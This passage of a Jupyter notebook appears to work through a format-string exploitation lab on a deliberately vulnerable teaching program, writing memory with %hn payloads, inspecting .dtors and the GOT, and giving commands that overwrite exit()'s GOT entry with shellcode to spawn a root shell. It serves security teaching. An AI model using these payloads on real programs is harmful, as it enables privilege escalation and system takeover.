                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ffffcc90                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     f7dd0658\r\n",
      "[*] test_val @ 0x0804a02c = -1073742478 0xbffffd72\r\n"
     ]
    }
   ],
   "source": [
    "# finally write 0xbffffd72 to test_val using 4th and 5th parameters\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\\x2e\\xa0\\x04\\x08\"')%64874x%4\\$hn%49805x%5\\$hn"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Control the execution flow of the program\n",
    "- overwrite the return address in the most recent stack frame\n",
    "- stack-based overflow only allows overflowing return address\n",
    "- format string vulnerability provides the ability to overwrite any memory address!!\n",
    "\n",
    "### Detours with .dtors\n",
    "#### .dtors and .ctors are called something different in modern gcc and not sure\n",
    "#### !!!ignoring!!!\n",
    "- in GNU C compiled programs, special table sections called .dtors and .ctors are created\n",
    "- .dtors are made for destructors\n",
    "- .ctors are made for constructors\n",
    "- a function can be declared as a destructor function by defining the destructor attribute\n",
    "- let's see dtors_sample.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 85,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./booksrc/dtors_sample.c ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 86,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "\r\n",
      "static void cleanup(void) __attribute__ ((destructor));\r\n",
      "\r\n",
      "int main() {\r\n",
      "   printf(\"Some actions happen in the main() function..\\n\");\r\n",
      "   printf(\"and then when main() exits, the destructor is called..\\n\");\r\n",
      "\r\n",
      "   exit(0);\r\n",
      "}\r\n",
      "\r\n",
      "void cleanup(void) {\r\n",
      "   printf(\"In the cleanup function now..\\n\");\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat dtors_sample.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 89,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh dtors_sample.c dtors_sample.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 90,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Some actions happen in the main() function..\r\n",
      "and then when main() exits, the destructor is called..\r\n",
      "In the cleanup function now..\r\n"
     ]
    }
   ],
   "source": [
    "! ./dtors_sample.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 91,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0804a020 B __bss_start\r\n",
      "0804848e t cleanup\r\n",
      "0804a020 b completed.6612\r\n",
      "0804a018 D __data_start\r\n",
      "0804a018 W data_start\r\n",
      "08048390 t deregister_tm_clones\r\n",
      "08048370 T _dl_relocate_static_pie\r\n",
      "08048410 t __do_global_dtors_aux\r\n",
      "08049f0c t __do_global_dtors_aux_fini_array_entry\r\n",
      "0804a01c D __dso_handle\r\n",
      "08049f14 d _DYNAMIC\r\n",
      "0804a020 D _edata\r\n",
      "0804a024 B _end\r\n",
      "         U exit@@GLIBC_2.0\r\n",
      "08048528 T _fini\r\n",
      "0804853c R _fp_hw\r\n",
      "08048440 t frame_dummy\r\n",
      "08049f08 t __frame_dummy_init_array_entry\r\n",
      "08048770 r __FRAME_END__\r\n",
      "0804a000 d _GLOBAL_OFFSET_TABLE_\r\n",
      "         w __gmon_start__\r\n",
      "080485cc r __GNU_EH_FRAME_HDR\r\n",
      "080482c8 T _init\r\n",
      "08049f0c t __init_array_end\r\n",
      "08049f08 t __init_array_start\r\n",
      "08048540 R _IO_stdin_used\r\n",
      "08048520 T __libc_csu_fini\r\n",
      "080484c0 T __libc_csu_init\r\n",
      "         U __libc_start_main@@GLIBC_2.0\r\n",
      "08048446 T main\r\n",
      "         U puts@@GLIBC_2.0\r\n",
      "080483d0 t register_tm_clones\r\n",
      "08048330 T _start\r\n",
      "0804a020 D __TMC_END__\r\n",
      "080484b9 T __x86.get_pc_thunk.ax\r\n",
      "08048521 T __x86.get_pc_thunk.bp\r\n",
      "08048380 T __x86.get_pc_thunk.bx\r\n"
     ]
    }
   ],
   "source": [
    "# nm command can be used to find the address of the cleanup()\n",
    "# look for __DTOR_LIST__ and __DTOR_END__ \n",
    "# wont' find it!!\n",
    "\n",
    "! nm ./dtors_sample.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 92,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nm ./dtors_sample.exe | grep DTOR"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 93,
   "metadata": {},
   "outputs": [],
   "source": [
    "! nm ./fmt_vuln.exe | grep DTOR"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 94,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "There are 34 section headers, starting at offset 0x1f84:\r\n",
      "\r\n",
      "Section Headers:\r\n",
      "  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al\r\n",
      "  [ 0]                   NULL            00000000 000000 000000 00      0   0  0\r\n",
      "  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1\r\n",
      "  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4\r\n",
      "  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4\r\n",
      "  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4\r\n",
      "  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4\r\n",
      "  [ 6] .dynstr           STRTAB          0804822c 00022c 00004f 00   A  0   0  1\r\n",
      "  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2\r\n",
      "  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4\r\n",
      "  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4\r\n",
      "  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  22  4\r\n",
      "  [11] .init             PROGBITS        080482c8 0002c8 000020 00  AX  0   0  4\r\n",
      "  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16\r\n",
      "  [13] .text             PROGBITS        08048330 000330 0001f5 00  AX  0   0 16\r\n",
      "  [14] .fini             PROGBITS        08048528 000528 000014 00  AX  0   0  4\r\n",
      "  [15] .rodata           PROGBITS        0804853c 00053c 00008d 00   A  0   0  4\r\n",
      "  [16] .eh_frame_hdr     PROGBITS        080485cc 0005cc 000054 00   A  0   0  4\r\n",
      "  [17] .eh_frame         PROGBITS        08048620 000620 000154 00   A  0   0  4\r\n",
      "  [18] .init_array       INIT_ARRAY      08049f08 000f08 000004 04  WA  0   0  4\r\n",
      "  [19] .fini_array       FINI_ARRAY      08049f0c 000f0c 000008 04  WA  0   0  4\r\n",
      "  [20] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4\r\n",
      "  [21] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4\r\n",
      "  [22] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4\r\n",
      "  [23] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4\r\n",
      "  [24] .bss              NOBITS          0804a020 001020 000004 00  WA  0   0  1\r\n",
      "  [25] .comment          PROGBITS        00000000 001020 00001d 01  MS  0   0  1\r\n",
      "  [26] .debug_aranges    PROGBITS        00000000 00103d 000020 00      0   0  1\r\n",
      "  [27] .debug_info       PROGBITS        00000000 00105d 0002f2 00      0   0  1\r\n",
      "  [28] .debug_abbrev     PROGBITS        00000000 00134f 0000d6 00      0   0  1\r\n",
      "  [29] .debug_line       PROGBITS        00000000 001425 0000f4 00      0   0  1\r\n",
      "  [30] .debug_str        PROGBITS        00000000 001519 000279 01  MS  0   0  1\r\n",
      "  [31] .symtab           SYMTAB          00000000 001794 000480 10     32  49  4\r\n",
      "  [32] .strtab           STRTAB          00000000 001c14 00022d 00      0   0  1\r\n",
      "  [33] .shstrtab         STRTAB          00000000 001e41 000141 00      0   0  1\r\n",
      "Key to Flags:\r\n",
      "  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),\r\n",
      "  L (link order), O (extra OS processing required), G (group), T (TLS),\r\n",
      "  C (compressed), x (unknown), o (OS specific), E (exclude),\r\n",
      "  p (processor specific)\r\n"
     ]
    }
   ],
   "source": [
    "# display all section headers\n",
    "!readelf -S dtors_sample.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./dtors_sample.exe:     file format elf32-i386\r\n",
      "\r\n",
      "objdump: section '.dtors' mentioned in a -j option, but not found in any input file\r\n"
     ]
    }
   ],
   "source": [
    "# objdump command shows the actual contents of the .dtors section\n",
    "! objdump -s -j .dtors ./dtors_sample.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./dtors_sample.exe:     file format elf32-i386\r\n",
      "\r\n",
      "Sections:\r\n",
      "Idx Name          Size      VMA       LMA       File off  Algn\r\n",
      "  0 .interp       00000013  08048154  08048154  00000154  2**0\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  1 .note.ABI-tag 00000020  08048168  08048168  00000168  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  2 .note.gnu.build-id 00000024  08048188  08048188  00000188  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  3 .gnu.hash     00000020  080481ac  080481ac  000001ac  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  4 .dynsym       00000060  080481cc  080481cc  000001cc  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  5 .dynstr       0000004f  0804822c  0804822c  0000022c  2**0\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  6 .gnu.version  0000000c  0804827c  0804827c  0000027c  2**1\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  7 .gnu.version_r 00000020  08048288  08048288  00000288  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  8 .rel.dyn      00000008  080482a8  080482a8  000002a8  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      "  9 .rel.plt      00000018  080482b0  080482b0  000002b0  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      " 10 .init         00000020  080482c8  080482c8  000002c8  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, CODE\r\n",
      " 11 .plt          00000040  080482f0  080482f0  000002f0  2**4\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, CODE\r\n",
      " 12 .text         000001f5  08048330  08048330  00000330  2**4\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, CODE\r\n",
      " 13 .fini         00000014  08048528  08048528  00000528  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, CODE\r\n",
      " 14 .rodata       0000008d  0804853c  0804853c  0000053c  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      " 15 .eh_frame_hdr 00000054  080485cc  080485cc  000005cc  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      " 16 .eh_frame     00000154  08048620  08048620  00000620  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, READONLY, DATA\r\n",
      " 17 .init_array   00000004  08049f08  08049f08  00000f08  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, DATA\r\n",
      " 18 .fini_array   00000008  08049f0c  08049f0c  00000f0c  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, DATA\r\n",
      " 19 .dynamic      000000e8  08049f14  08049f14  00000f14  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, DATA\r\n",
      " 20 .got          00000004  08049ffc  08049ffc  00000ffc  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, DATA\r\n",
      " 21 .got.plt      00000018  0804a000  0804a000  00001000  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, DATA\r\n",
      " 22 .data         00000008  0804a018  0804a018  00001018  2**2\r\n",
      "                  CONTENTS, ALLOC, LOAD, DATA\r\n",
      " 23 .bss          00000004  0804a020  0804a020  00001020  2**0\r\n",
      "                  ALLOC\r\n",
      " 24 .comment      0000001d  00000000  00000000  00001020  2**0\r\n",
      "                  CONTENTS, READONLY\r\n",
      " 25 .debug_aranges 00000020  00000000  00000000  0000103d  2**0\r\n",
      "                  CONTENTS, READONLY, DEBUGGING\r\n",
      " 26 .debug_info   000002f2  00000000  00000000  0000105d  2**0\r\n",
      "                  CONTENTS, READONLY, DEBUGGING\r\n",
      " 27 .debug_abbrev 000000d6  00000000  00000000  0000134f  2**0\r\n",
      "                  CONTENTS, READONLY, DEBUGGING\r\n",
      " 28 .debug_line   000000f4  00000000  00000000  00001425  2**0\r\n",
      "                  CONTENTS, READONLY, DEBUGGING\r\n",
      " 29 .debug_str    00000279  00000000  00000000  00001519  2**0\r\n",
      "                  CONTENTS, READONLY, DEBUGGING\r\n"
     ]
    }
   ],
   "source": [
    "! objdump -h ./dtors_sample.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Overwriting the Global Offset Table\n",
    "- PLT (procedure linkage table) is used to store shared library\n",
    "- consists of many jump instructions each one corresponding to the address of a function\n",
    "- each time a shared function needs to be called, control will pass through the PLT\n",
    "- objdump program can be used to see .plt section\n",
    "- exit() is called at the end of the program\n",
    "- if exit() function can be manipulated to direct the execution flow into shellcode, a root shell will be spawned\n",
    "- most of the functions are not jumping to addresses but to pointers to addresses\n",
    "    - e.g., exit() function's address is stored at `0x0804a018`\n",
    "- these addresses exist in another section, called the global offset table (GOT) which is writable"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./fmt_vuln.exe:     file format elf32-i386\r\n",
      "\r\n",
      "\r\n",
      "Disassembly of section .plt:\r\n",
      "\r\n",
      "08048350 <printf@plt-0x10>:\r\n",
      " 8048350:\tff 35 04 a0 04 08    \tpushl  0x804a004\r\n",
      " 8048356:\tff 25 08 a0 04 08    \tjmp    *0x804a008\r\n",
      " 804835c:\t00 00                \tadd    %al,(%eax)\r\n",
      "\t...\r\n",
      "\r\n",
      "08048360 <printf@plt>:\r\n",
      " 8048360:\tff 25 0c a0 04 08    \tjmp    *0x804a00c\r\n",
      " 8048366:\t68 00 00 00 00       \tpush   $0x0\r\n",
      " 804836b:\te9 e0 ff ff ff       \tjmp    8048350 <_init+0x24>\r\n",
      "\r\n",
      "08048370 <strcpy@plt>:\r\n",
      " 8048370:\tff 25 10 a0 04 08    \tjmp    *0x804a010\r\n",
      " 8048376:\t68 08 00 00 00       \tpush   $0x8\r\n",
      " 804837b:\te9 d0 ff ff ff       \tjmp    8048350 <_init+0x24>\r\n",
      "\r\n",
      "08048380 <puts@plt>:\r\n",
      " 8048380:\tff 25 14 a0 04 08    \tjmp    *0x804a014\r\n",
      " 8048386:\t68 10 00 00 00       \tpush   $0x10\r\n",
      " 804838b:\te9 c0 ff ff ff       \tjmp    8048350 <_init+0x24>\r\n",
      "\r\n",
      "08048390 <exit@plt>:\r\n",
      " 8048390:\tff 25 18 a0 04 08    \tjmp    *0x804a018\r\n",
      " 8048396:\t68 18 00 00 00       \tpush   $0x18\r\n",
      " 804839b:\te9 b0 ff ff ff       \tjmp    8048350 <_init+0x24>\r\n",
      "\r\n",
      "080483a0 <__libc_start_main@plt>:\r\n",
      " 80483a0:\tff 25 1c a0 04 08    \tjmp    *0x804a01c\r\n",
      " 80483a6:\t68 20 00 00 00       \tpush   $0x20\r\n",
      " 80483ab:\te9 a0 ff ff ff       \tjmp    8048350 <_init+0x24>\r\n",
      "\r\n",
      "080483b0 <putchar@plt>:\r\n",
      " 80483b0:\tff 25 20 a0 04 08    \tjmp    *0x804a020\r\n",
      " 80483b6:\t68 28 00 00 00       \tpush   $0x28\r\n",
      " 80483bb:\te9 90 ff ff ff       \tjmp    8048350 <_init+0x24>\r\n"
     ]
    }
   ],
   "source": [
    "! objdump -d -j .plt ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "./fmt_vuln.exe:     file format elf32-i386\r\n",
      "\r\n",
      "DYNAMIC RELOCATION RECORDS\r\n",
      "OFFSET   TYPE              VALUE \r\n",
      "08049ffc R_386_GLOB_DAT    __gmon_start__\r\n",
      "0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0\r\n",
      "0804a010 R_386_JUMP_SLOT   strcpy@GLIBC_2.0\r\n",
      "0804a014 R_386_JUMP_SLOT   puts@GLIBC_2.0\r\n",
      "0804a018 R_386_JUMP_SLOT   exit@GLIBC_2.0\r\n",
      "0804a01c R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0\r\n",
      "0804a020 R_386_JUMP_SLOT   putchar@GLIBC_2.0\r\n",
      "\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "# display all dynamic relocations\n",
    "! objdump -R ./fmt_vuln.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- NOTE: exit()'s GOT address\n",
    "\n",
    "## Smuggle Shellcode & Exploit\n",
    "- create shellcode using gdb-peda - see [GDB-Peda.ipynb](./GDB-Peda.ipynb) Notebook for details\n",
    "- use perl -e 'print to write shellcode as a binary file' > shellcode.bin\n",
    "- export shllcode as an env variable\n",
    "- find and write the address of shellcode into the address of the exit() function\n",
    "- you'll get a shell, when the program exits!\n",
    "\n",
    "```\n",
    "$ export SHELLCODE=$(cat shellcode.bin)\n",
    "$ ./getenvaddr.exe SHELLCODE ./fmt_vuln.exe\n",
    "$ echo $((0xbfff - 8)) # higher two bytes\n",
    "$ echo $((0xf020 - 0xbfff)) # lower two bytes\n",
    "# write to higher byte address for exit() first and then to lower byte address\n",
    "$ ./fmt_vuln.exe $(printf \"\\x1a\\xa0\\x04\\x08\\x18\\xa0\\x04\\x08\")%49143x%4\\$hn%12321x%5\\$hn\n",
    "```\n",
    "\n",
    "### Advantage of using GOT\n",
    "- GOT entries are fixed per binary\n",
    "    - different system with the same binary will have the same GOT entry at the same address\n",
    "    \n",
